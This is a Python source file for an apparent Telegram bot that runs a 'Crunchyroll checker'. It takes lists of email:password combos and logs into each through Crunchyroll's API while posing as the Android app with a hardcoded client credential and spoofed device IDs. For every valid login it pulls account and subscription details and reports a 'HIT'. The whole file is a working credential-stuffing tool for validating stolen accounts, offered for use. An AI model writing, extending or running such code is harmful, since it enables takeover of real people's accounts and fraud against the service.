import requests
import time

def process_crunchy_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ CRUNCHYROLL CHECKER\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_crunchy_account(account)
            results.append(f"Combo: {account}\nResponse => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /crunchy email:password")

def check_crunchy_account(account):
    email, password = account.split(':')
    login_url = "https://beta-api.crunchyroll.com/auth/v1/token"
    headers = {
        "Authorization": "Basic Z3N1ZnB0YjBmYW43dGFndG1ub3I6UUU1djBqc3Y5OVhNY2xadVNPX0Jfem1wOE03YlBfMnM=",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "ETP-Anonymous-Id": "b10da375-d759-47ce-aa9e-d666157c4325",
        "Host": "beta-api.crunchyroll.com",
        "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
    }
    data = {
        'username': email,
        'password': password,
        'grant_type': 'password',
        'scope': 'offline_access',
        'device_id': 'a6856484-cbcd-46f5-99b9-db8cff57ec17',
        'device_name': 'SM-G988N',
        'device_type': 'samsung SM-G9810'
    }

    response = requests.post(login_url, headers=headers, data=data)
    response_data = response.json()

    if 'access_token' in response_data:
        access_token = response_data['access_token']

        # Second request to get account information
        account_info_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
        account_info_headers = {
            "Authorization": f"Bearer {access_token}",
            "Connection": "Keep-Alive",
            "Host": "beta-api.crunchyroll.com",
            "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
        }

        account_info_response = requests.get(account_info_url, headers=account_info_headers)
        account_info_data = account_info_response.json()

        email_verified = account_info_data.get('email_verified', 'N/A')
        account_creation_date = account_info_data.get('created', 'N/A')[:10]
        external_id = account_info_data.get('external_id', 'N/A')

        # Third request to get subscription information
        subscription_info_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
        subscription_info_headers = {
            "Authorization": f"Bearer {access_token}",
            "Connection": "Keep-Alive",
            "Host": "beta-api.crunchyroll.com",
            "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
        }

        subscription_info_response = requests.get(subscription_info_url, headers=subscription_info_headers)
        subscription_info_data = subscription_info_response.json()

        subscription_name = subscription_info_data.get('sku', 'Subscription Not Found')
        currency = subscription_info_data.get('currency_code', 'N/A')
        subscription_amount = subscription_info_data.get('amount', 'N/A')

        return (f"HIT SUCCESSFULLY✅\n"
                f"Email Verified: {email_verified}\n"
                f"Account Creation Date: {account_creation_date}\n"
                f"Subscription Name: {subscription_name}\n"
                f"Currency: {currency}\n"
                f"Subscription Amount: {subscription_amount}")
    else:
        return "Invalid Credentials🚫"

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
